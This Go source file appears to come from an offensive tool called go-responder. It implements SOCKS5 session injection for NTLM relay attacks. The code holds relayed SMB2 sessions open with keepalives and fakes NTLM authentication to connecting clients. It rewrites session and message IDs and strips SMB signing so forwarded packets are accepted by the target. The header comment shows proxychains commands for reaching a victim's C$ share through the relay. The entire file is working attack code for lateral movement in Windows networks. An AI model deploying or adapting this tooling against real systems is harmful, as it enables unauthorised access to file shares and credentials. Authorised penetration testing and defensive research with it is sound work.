// Package relay — SOCKS5 session injection.
//
// After a successful NTLM relay we keep the authenticated SMB2 connection to
// the target alive and register it in the global Pool.  A SOCKS5 listener
// accepts incoming connections; for each CONNECT to a target we own, we run
// the fake-auth dance so the SOCKS client thinks it authenticated, then proxy
// raw SMB2 packets while substituting our real sessionID.
//
// Typical usage with proxychains:
//
//	socks5 192.168.62.1 1080          # in /etc/proxychains4.conf
//	proxychains smbclient //192.168.62.22/C$ -U 'x%x' --no-pass
//	proxychains crackmapexec smb 192.168.62.22 --shares
package relay

import (
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"sync"
	"sync/atomic"
	"time"

	"go-responder/internal/core"
)

// SocksPort is the TCP port the SOCKS5 listener binds to.
// 0 = disabled.  Set from --socks-port at startup.
var SocksPort int

// Pool is the global registry of live authenticated relay sessions.
var Pool = &SessionPool{sessions: make(map[string]*RelaySession)}

var poolCounter int64

// ── session pool ──────────────────────────────────────────────────────────────

// RelaySession holds one authenticated SMB2 session to a relay target.
type RelaySession struct {
	ID        int64
	TargetIP  net.IP
	SessionID uint64
	Shares    []string // accessible shares discovered by postAuthActions
	conn      *smbConn
	mu        sync.Mutex    // serialises all I/O on conn
	stop      chan struct{}  // closed to kill the keepalive goroutine
}

// SessionPool is a thread-safe map of live relay sessions keyed by target IP.
type SessionPool struct {
	mu       sync.RWMutex
	sessions map[string]*RelaySession
}

// Register stores conn in the pool and starts a background keepalive.
// It removes the conn's deadline so the session lives indefinitely.
func (p *SessionPool) Register(targetIP net.IP, sessionID uint64, conn *smbConn, shares []string) *RelaySession {
	s := &RelaySession{
		ID:        atomic.AddInt64(&poolCounter, 1),
		TargetIP:  targetIP,
		SessionID: sessionID,
		Shares:    shares,
		conn:      conn,
		stop:      make(chan struct{}),
	}
	conn.conn.SetDeadline(time.Time{}) // no deadline — keepalive owns liveness
	p.mu.Lock()
	p.sessions[targetIP.String()] = s
	p.mu.Unlock()
	go s.keepAlive()
	return s
}

// Get returns the live session for targetIP, or nil.
func (p *SessionPool) Get(targetIP net.IP) *RelaySession {
	p.mu.RLock()
	defer p.mu.RUnlock()
	return p.sessions[targetIP.String()]
}

// Remove removes the session from the pool (does not close the connection).
func (p *SessionPool) Remove(s *RelaySession) {
	p.mu.Lock()
	if cur := p.sessions[s.TargetIP.String()]; cur == s {
		delete(p.sessions, s.TargetIP.String())
	}
	p.mu.Unlock()
}

// List returns a snapshot of all live sessions.
func (p *SessionPool) List() []*RelaySession {
	p.mu.RLock()
	defer p.mu.RUnlock()
	out := make([]*RelaySession, 0, len(p.sessions))
	for _, s := range p.sessions {
		out = append(out, s)
	}
	return out
}

// PrintPool prints the current relay session table.
func (p *SessionPool) PrintPool(socksIP net.IP) {
	sessions := p.List()
	if len(sessions) == 0 {
		return
	}
	sep := "────────────────────────────────────────────────────────────────"
	fmt.Printf("\n%s%s%s\n", core.CDim, sep, core.CReset)
	fmt.Printf("%s[*]%s Active relay sessions  %sSocks5 %s:%d%s\n",
		core.CCyan, core.CReset, core.CDim, socksIP, SocksPort, core.CReset)
	fmt.Printf("    %s%-4s  %-18s  %-14s  Session ID%s\n",
		core.CDim, "#", "Target", "Shares", core.CReset)
	for _, s := range sessions {
		shares := "none"
		if len(s.Shares) > 0 {
			shares = ""
			for i, sh := range s.Shares {
				// extract last component after last backslash
				for j := len(sh) - 1; j >= 0; j-- {
					if sh[j] == '\\' {
						sh = sh[j+1:]
						break
					}
				}
				if i > 0 {
					shares += " "
				}
				shares += sh
			}
		}
		fmt.Printf("    %-4d  %-18s  %-14s  0x%X\n",
			s.ID, s.TargetIP, shares, s.SessionID)
	}
	fmt.Printf("%s%s%s\n\n", core.CDim, sep, core.CReset)
}

// keepAlive sends SMB2 ECHO every 30 s to keep the server session alive.
func (s *RelaySession) keepAlive() {
	tick := time.NewTicker(30 * time.Second)
	defer tick.Stop()
	for {
		select {
		case <-tick.C:
			s.mu.Lock()
			hdr := smb2Hdr(0x000B, s.conn.nextMsgID(), 0, s.SessionID, 0)
			body := []byte{0x04, 0x00, 0x00, 0x00} // StructureSize=4
			s.conn.conn.SetDeadline(time.Now().Add(10 * time.Second))
			err := s.conn.send(append(hdr, body...))
			if err == nil {
				_, err = s.conn.recv()
			}
			s.conn.conn.SetDeadline(time.Time{})
			s.mu.Unlock()
			if err != nil {
				Pool.Remove(s)
				core.LogInfo("[SOCKS] session #%d dropped (keepalive failed): %v", s.ID, err)
				return
			}
		case <-s.stop:
			return
		}
	}
}

// ── SOCKS5 listener ───────────────────────────────────────────────────────────

// ServeSocks starts the SOCKS5 listener.
func ServeSocks(ip net.IP, port int) {
	ln, err := net.Listen("tcp4", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		core.LogError("SOCKS5 listen :%d — %v (need root?)", port, err)
		return
	}
	core.LogInfo("SOCKS5 relay proxy on %s:%d", ip, port)
	for {
		c, err := ln.Accept()
		if err != nil {
			continue
		}
		go handleSocksConn(c)
	}
}

func handleSocksConn(c net.Conn) {
	defer c.Close()
	c.SetDeadline(time.Now().Add(30 * time.Second))

	targetIP, _, err := socks5Handshake(c)
	if err != nil {
		core.LogVerbose("[SOCKS] handshake from %s: %v", c.RemoteAddr(), err)
		return
	}

	sess := Pool.Get(targetIP)
	if sess == nil {
		// No authenticated session for this target.
		c.Write([]byte{0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0}) // host unreachable
		core.LogVerbose("[SOCKS] no session for %s", targetIP)
		return
	}

	// SOCKS5 success reply (BIND_ADDR = 0.0.0.0:0).
	c.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
	c.SetDeadline(time.Time{})

	core.LogInfo("[SOCKS] client %s → session #%d (target %s  sessionID=0x%X)",
		c.RemoteAddr(), sess.ID, sess.TargetIP, sess.SessionID)

	injectSession(c, sess)
}

// socks5Handshake performs the RFC 1928 greeting + CONNECT and returns the
// target IP and port.  Only NO-AUTH and IPv4/domain CONNECT are supported.
func socks5Handshake(c net.Conn) (net.IP, int, error) {
	hdr := make([]byte, 2)
	if _, err := io.ReadFull(c, hdr); err != nil {
		return nil, 0, err
	}
	if hdr[0] != 0x05 {
		return nil, 0, fmt.Errorf("not SOCKS5 (ver=0x%02x)", hdr[0])
	}
	methods := make([]byte, int(hdr[1]))
	if _, err := io.ReadFull(c, methods); err != nil {
		return nil, 0, err
	}
	c.Write([]byte{0x05, 0x00}) // accept NO-AUTH

	req := make([]byte, 4)
	if _, err := io.ReadFull(c, req); err != nil {
		return nil, 0, err
	}
	if req[0] != 0x05 || req[1] != 0x01 {
		return nil, 0, fmt.Errorf("unsupported SOCKS5 command 0x%02x", req[1])
	}

	var targetIP net.IP
	switch req[3] {
	case 0x01: // IPv4
		addr := make([]byte, 4)
		if _, err := io.ReadFull(c, addr); err != nil {
			return nil, 0, err
		}
		targetIP = net.IP(addr)
	case 0x03: // domain name
		lb := make([]byte, 1)
		if _, err := io.ReadFull(c, lb); err != nil {
			return nil, 0, err
		}
		domain := make([]byte, int(lb[0]))
		if _, err := io.ReadFull(c, domain); err != nil {
			return nil, 0, err
		}
		addrs, err := net.LookupHost(string(domain))
		if err != nil || len(addrs) == 0 {
			return nil, 0, fmt.Errorf("cannot resolve %s", domain)
		}
		targetIP = net.ParseIP(addrs[0]).To4()
	default:
		return nil, 0, fmt.Errorf("unsupported ATYP 0x%02x", req[3])
	}

	portBuf := make([]byte, 2)
	if _, err := io.ReadFull(c, portBuf); err != nil {
		return nil, 0, err
	}
	port := int(portBuf[0])<<8 | int(portBuf[1])
	return targetIP, port, nil
}

// ── SMB session injection ─────────────────────────────────────────────────────

// injectSession runs the fake SMB2 authenticate dance then proxies raw
// SMB2 packets, rewriting MessageId and SessionId on the fly.
func injectSession(client net.Conn, sess *RelaySession) {
	// ── Phase 1: fake NEGOTIATE + SESSION_SETUP ───────────────────────────
	first, err := recvNB(client)
	if err != nil {
		return
	}

	// SMB1 multi-protocol NEGOTIATE → send SMB2 upgrade (clients expect msgID=0)
	if isSMB1(first) {
		realResp := targetNegotiateResp(sess.TargetIP, 0)
		if err := sendNB(client, realResp); err != nil {
			return
		}
		first, err = recvNB(client)
		if err != nil {
			return
		}
	}

	if !isSMB2(first) || len(first) < 64 {
		return
	}
	cmd := binary.LittleEndian.Uint16(first[12:14])

	// SMB2 NEGOTIATE → relay target's real response so the client sees the
	// correct machine name, domain, capabilities and signing policy.
	if cmd == 0x0000 {
		negMsgID := binary.LittleEndian.Uint64(first[24:32])
		realResp := targetNegotiateResp(sess.TargetIP, negMsgID)
		if err := sendNB(client, realResp); err != nil {
			return
		}
		first, err = recvNB(client)
		if err != nil {
			return
		}
		if !isSMB2(first) || len(first) < 64 {
			return
		}
		cmd = binary.LittleEndian.Uint16(first[12:14])
	}

	if cmd != 0x0001 { // must be SESSION_SETUP
		return
	}

	// SESSION_SETUP Type 1 → send fake NTLM challenge
	setup1MsgID := binary.LittleEndian.Uint64(first[24:32])
	challenge := core.GetChallenge()
	ntlmChal := core.BuildNTLMChallenge(challenge, core.SessionDomain, core.SessionMachineName)
	spnego := core.WrapSPNEGOChallenge(ntlmChal)
	if err := sendNB(client, buildSocksChallenge(setup1MsgID, spnego)); err != nil {
		return
	}

	// SESSION_SETUP Type 3 → ignore content, reply with SUCCESS + real sessionID
	type3, err := recvNB(client)
	if err != nil {
		return
	}
	if !isSMB2(type3) || len(type3) < 64 {
		return
	}
	if binary.LittleEndian.Uint16(type3[12:14]) != 0x0001 {
		return
	}
	setup3MsgID := binary.LittleEndian.Uint64(type3[24:32])

	sess.mu.Lock()
	realSessionID := sess.SessionID
	sess.mu.Unlock()

	if err := sendNB(client, buildSocksSuccess(setup3MsgID, realSessionID)); err != nil {
		return
	}
	core.LogVerbose("[SOCKS] session #%d auth injected — proxying", sess.ID)

	// ── Phase 2: proxy loop ───────────────────────────────────────────────
	for {
		req, err := recvNB(client)
		if err != nil {
			return
		}
		if !isSMB2(req) || len(req) < 64 {
			return
		}

		reqCmd := binary.LittleEndian.Uint16(req[12:14])
		clientMsgID := binary.LittleEndian.Uint64(req[24:32])

		// LOGOFF: clean up gracefully
		if reqCmd == 0x0002 {
			sess.mu.Lock()
			close(sess.stop)
			sess.conn.close()
			sess.mu.Unlock()
			Pool.Remove(sess)
			sendNB(client, buildLogoffResp(clientMsgID))
			core.LogInfo("[SOCKS] session #%d terminated (logoff)", sess.ID)
			return
		}

		sess.mu.Lock()
		targetMsgID := sess.conn.nextMsgID()
		// Rewrite MessageId and SessionId so the target accepts the packet.
		binary.LittleEndian.PutUint64(req[24:32], targetMsgID)
		binary.LittleEndian.PutUint64(req[40:48], sess.SessionID)
		// Strip SMB2_FLAGS_SIGNED (0x8) and zero the Signature field.
		// The client signs with its own local session key; the target would
		// reject those signatures because the session was established via relay.
		flags := binary.LittleEndian.Uint32(req[16:20])
		if flags&0x00000008 != 0 {
			binary.LittleEndian.PutUint32(req[16:20], flags&^uint32(0x00000008))
			copy(req[48:64], make([]byte, 16))
		}

		sess.conn.conn.SetDeadline(time.Now().Add(30 * time.Second))
		sendErr := sess.conn.send(req)
		var resp []byte
		if sendErr == nil {
			resp, err = sess.conn.recv()
		}
		sess.conn.conn.SetDeadline(time.Time{})
		sess.mu.Unlock()

		if sendErr != nil || err != nil {
			core.LogVerbose("[SOCKS] session #%d target I/O error", sess.ID)
			return
		}

		// Rewrite MessageId in response to match what the client expects.
		if len(resp) >= 64 {
			binary.LittleEndian.PutUint64(resp[24:32], clientMsgID)
		}
		if err := sendNB(client, resp); err != nil {
			return
		}
	}
}

// ── response builders (victim-facing) ────────────────────────────────────────

// buildSocksNegotiateResp is like buildNegotiateResp but forces SecurityMode=0x0001
// (signing enabled, NOT required).  SOCKS clients must not sign — if they do,
// their signatures are computed with a session key we don't have, and the target
// will reject the forwarded packets with STATUS_INVALID_PARAMETER.
func buildSocksNegotiateResp(msgID uint64) []byte {
	resp := buildNegotiateResp(msgID)
	// SecurityMode sits at bytes [64+2 : 64+4] (after StructureSize uint16).
	if len(resp) >= 68 {
		binary.LittleEndian.PutUint16(resp[66:68], 0x0001)
	}
	return resp
}

// buildSocksChallenge wraps spnego in a SESSION_SETUP MORE_PROCESSING response.
func buildSocksChallenge(msgID uint64, spnego []byte) []byte {
	hdr := smb2RespHdr(0x0001, msgID, smb2StatusMoreProcessingRequired, 0)
	secBufOff := uint16(64 + 8)
	var body []byte
	body = binary.LittleEndian.AppendUint16(body, 9)
	body = binary.LittleEndian.AppendUint16(body, 0)
	body = binary.LittleEndian.AppendUint16(body, secBufOff)
	body = binary.LittleEndian.AppendUint16(body, uint16(len(spnego)))
	body = append(body, spnego...)
	return append(hdr, body...)
}

// buildSocksSuccess sends SESSION_SETUP STATUS_SUCCESS with the real sessionID.
// After this the client uses realSessionID in all subsequent requests, which is
// exactly what we need — no rewriting in the proxy loop.
func buildSocksSuccess(msgID, sessionID uint64) []byte {
	hdr := smb2RespHdr(0x0001, msgID, smb2StatusSuccess, sessionID)
	var body []byte
	body = binary.LittleEndian.AppendUint16(body, 9)    // StructureSize
	body = binary.LittleEndian.AppendUint16(body, 0)    // SessionFlags
	body = binary.LittleEndian.AppendUint16(body, 64+8) // SecurityBufferOffset
	body = binary.LittleEndian.AppendUint16(body, 0)    // SecurityBufferLength (empty)
	return append(hdr, body...)
}

// buildLogoffResp acknowledges an SMB2 LOGOFF from the client.
func buildLogoffResp(msgID uint64) []byte {
	hdr := smb2RespHdr(0x0002, msgID, smb2StatusSuccess, 0)
	return append(hdr, 0x04, 0x00) // StructureSize = 4
}

// targetNegotiateResp opens a short-lived probe connection to the target,
// fetches its real SMB2 NEGOTIATE response (which carries the true machine
// name, domain, server GUID, capabilities and signing policy), patches the
// MessageId to match the client's request, and returns it.
//
// If the probe fails for any reason we fall back to our own fake response so
// the SOCKS session can still proceed — clients will just see a generic name.
func targetNegotiateResp(targetIP net.IP, clientMsgID uint64) []byte {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(targetIP.String(), "445"), 3*time.Second)
	if err != nil {
		return buildSocksNegotiateResp(clientMsgID)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(5 * time.Second))

	probe := &smbConn{conn: conn}
	resp, err := probe.negotiate()
	if err != nil || len(resp) < 64 {
		return buildSocksNegotiateResp(clientMsgID)
	}

	// The server response has SMB2_FLAGS_SERVER_TO_REDIR set and the real
	// SecurityMode.  Just fix up the MessageId so the client's sequence check
	// passes.
	binary.LittleEndian.PutUint64(resp[24:32], clientMsgID)
	return resp
}
